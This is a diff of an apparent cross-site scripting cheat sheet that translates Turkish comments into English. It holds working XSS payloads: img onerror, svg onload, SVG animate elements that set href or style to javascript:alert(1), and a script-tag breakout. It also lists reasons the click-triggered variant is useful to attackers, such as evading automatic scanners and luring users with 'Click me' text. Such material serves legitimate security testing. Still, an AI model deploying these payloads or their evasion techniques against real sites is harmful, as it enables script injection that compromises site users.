@@ -24,24 +24,26 @@ Custom tag
 "><img src=x onerror=alert(1)>
 "><svg onload=alert(1)>
 
-<!-- Tıklanabilir XSS -->
+<!-- clickable XSS -->
 <svg><a><animate attributeName=href values=javascript:alert(1)></animate><text y=20 x=20>Click</text></a></svg>
 
-<!-- Otomatik tetiklenen -->
+<!-- auto triggered -->
 <svg><animate attributeName=onload values=alert(1) begin=0s dur=1s></svg>
 
 <!-- CSS injection -->
 <svg><animate attributeName=style values="background:url(javascript:alert(1))" dur=1s></svg>
 
-Begin=click’in Güvenlik Açısından Önemi
 
-1.Gizlilik: Kullanıcı tıklayana kadar zararlı kod gizli kalır
-2.Bypass: Otomatik güvenlik taramalarını atlatabilir
-3.Social Engineering: "Click me" gibi metinlerle kullanıcıyı kandırır
-4.Timing Control: Saldırganın istediği anda tetiklenir
+The Security Importance of Begin=click
+
+1. Stealth: Malicious code remains hidden until the user clicks.
+2. Bypass: Can bypass automatic security scans.
+3. Social Engineering: Triggers the user with text like "Click me."
+4. Timing Control: Triggered at the attacker's desired time.
 
 
-Gerçek Örnek
+
+real life example
 <svg width="200" height="50">
   <a>
     <animate attributeName="href" 
@@ -75,8 +77,6 @@ If there is such a things like that
 
 You could use a payload down below
 </script><script>alert(1)</script>
-
-
 
 
 
